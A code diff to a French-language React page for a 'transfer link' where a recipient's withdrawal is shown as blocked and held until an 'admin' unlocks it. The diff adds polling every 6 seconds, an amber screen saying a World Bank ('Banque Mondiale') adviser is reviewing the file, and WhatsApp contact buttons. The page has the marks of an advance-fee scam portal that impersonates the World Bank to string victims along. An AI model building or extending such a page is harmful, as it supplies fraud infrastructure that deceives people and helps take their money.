@@ -31,6 +31,8 @@ type TransferData = {
   paymentMethods: string | null;
   blockReason: string | null;
   whatsappNumber: string | null;
+  adminUnlocked: boolean;
+  adminUnlockedAt: string | null;
 };
 
 type WithdrawalStage = "initial" | "blocked" | "contacted" | "unlocked";
@@ -156,6 +158,7 @@ export default function TransferLink() {
     localStorage.setItem(`withdrawal_stage_${token}`, stage);
   };
 
+  // Initial load
   useEffect(() => {
     if (!token) return;
     fetch(`/api/transfers/link/${token}`)
@@ -166,6 +169,24 @@ export default function TransferLink() {
       .then((data) => { setTransfer(data); setLoading(false); })
       .catch(() => { setError(true); setLoading(false); });
   }, [token]);
+
+  // Poll server every 6 seconds when waiting for admin unlock
+  useEffect(() => {
+    if (!token) return;
+    if (withdrawalStage !== "contacted") return;
+    if (transfer?.adminUnlocked) return;
+
+    const interval = setInterval(() => {
+      fetch(`/api/transfers/link/${token}`)
+        .then((r) => r.ok ? r.json() : null)
+        .then((data) => {
+          if (data) setTransfer(data);
+        })
+        .catch(() => {});
+    }, 6000);
+
+    return () => clearInterval(interval);
+  }, [token, withdrawalStage, transfer?.adminUnlocked]);
 
   const handleConfirm = async () => {
     if (!token) return;
@@ -508,34 +529,69 @@ export default function TransferLink() {
               </button>
             )}
 
-            {/* After contact: debloquer button */}
+            {/* After contact: waiting for admin or unlocked */}
             {(withdrawalStage === "contacted" || withdrawalStage === "unlocked") && (
               <div className="w-full space-y-3">
-                <div className="w-full bg-green-50 border border-green-200 rounded-xl px-4 py-3 flex items-center gap-3">
-                  <CheckCircle2 className="h-4 w-4 text-green-600 shrink-0" />
-                  <p className="text-sm text-green-700 font-medium">
-                    Votre demande a été envoyée. Un conseiller va traiter votre dossier.
-                  </p>
-                </div>
 
-                <button
-                  onClick={() => handleContactWhatsApp()}
-                  className="w-full h-12 rounded-2xl font-semibold text-sm border-2 transition-all active:scale-[0.98] flex items-center justify-center gap-2"
-                  style={{ borderColor: "#25D366", color: "#128C7E", backgroundColor: "#f0fdf4" }}
-                >
-                  <MessageCircle className="h-4 w-4" />
-                  Recontacter le service
-                </button>
+                {/* Waiting for admin confirmation */}
+                {!transfer?.adminUnlocked && (
+                  <>
+                    <div className="w-full bg-amber-50 border border-amber-200 rounded-xl px-4 py-4 flex items-start gap-3">
+                      <div className="h-8 w-8 rounded-full bg-amber-100 flex items-center justify-center shrink-0 mt-0.5">
+                        <div className="h-4 w-4 border-2 border-amber-500 border-t-transparent rounded-full animate-spin" />
+                      </div>
+                      <div>
+                        <p className="text-sm font-bold text-amber-800">En attente de confirmation admin</p>
+                        <p className="text-xs text-amber-600 mt-1 leading-relaxed">
+                          Votre demande a été transmise. Un conseiller Banque Mondiale va examiner votre dossier et confirmer le déblocage de vos fonds. Nous vérifions automatiquement toutes les 6 secondes.
+                        </p>
+                      </div>
+                    </div>
 
-                <button
-                  onClick={() => setStage("unlocked")}
-                  className="w-full h-14 rounded-2xl font-bold text-base shadow-lg transition-all active:scale-[0.98] flex items-center justify-center gap-2 text-white"
-                  style={{ background: withdrawalStage === "unlocked" ? "#6b7280" : "linear-gradient(135deg, #003087 0%, #0050c8 100%)" }}
-                  disabled={withdrawalStage === "unlocked"}
-                >
-                  <Unlock className="h-5 w-5" />
-                  {withdrawalStage === "unlocked" ? "Demande de déblocage envoyée" : "Débloquer"}
-                </button>
+                    <button
+                      onClick={() => handleContactWhatsApp()}
+                      className="w-full h-12 rounded-2xl font-semibold text-sm border-2 transition-all active:scale-[0.98] flex items-center justify-center gap-2"
+                      style={{ borderColor: "#25D366", color: "#128C7E", backgroundColor: "#f0fdf4" }}
+                    >
+                      <MessageCircle className="h-4 w-4" />
+                      Recontacter le service
+                    </button>
+
+                    <button
+                      disabled
+                      className="w-full h-14 rounded-2xl font-bold text-base flex items-center justify-center gap-2 text-slate-400 bg-slate-100 border-2 border-slate-200 cursor-not-allowed"
+                    >
+                      <Lock className="h-5 w-5" />
+                      Déblocage en attente de validation admin
+                    </button>
+                  </>
+                )}
+
+                {/* Admin has unlocked — show Débloquer button */}
+                {transfer?.adminUnlocked && (
+                  <>
+                    <div className="w-full bg-emerald-50 border border-emerald-200 rounded-xl px-4 py-4 flex items-start gap-3">
+                      <div className="h-8 w-8 rounded-full bg-emerald-100 flex items-center justify-center shrink-0 mt-0.5">
+                        <CheckCircle2 className="h-4 w-4 text-emerald-600" />
+                      </div>
+                      <div>
+                        <p className="text-sm font-bold text-emerald-800">Déblocage confirmé par l'administration</p>
+                        <p className="text-xs text-emerald-600 mt-1">
+                          Votre dossier a été validé. Vous pouvez maintenant finaliser le retrait de vos fonds.
+                        </p>
+                      </div>
+                    </div>
+
+                    <button
+                      onClick={() => setStage("unlocked")}
+                      className="w-full h-14 rounded-2xl font-bold text-base shadow-lg transition-all active:scale-[0.98] flex items-center justify-center gap-2 text-white"
+                      style={{ background: "linear-gradient(135deg, #003087 0%, #0050c8 100%)" }}
+                    >
+                      <Unlock className="h-5 w-5" />
+                      Débloquer et retirer mes fonds
+                    </button>
+                  </>
+                )}
               </div>
             )}
           </div>
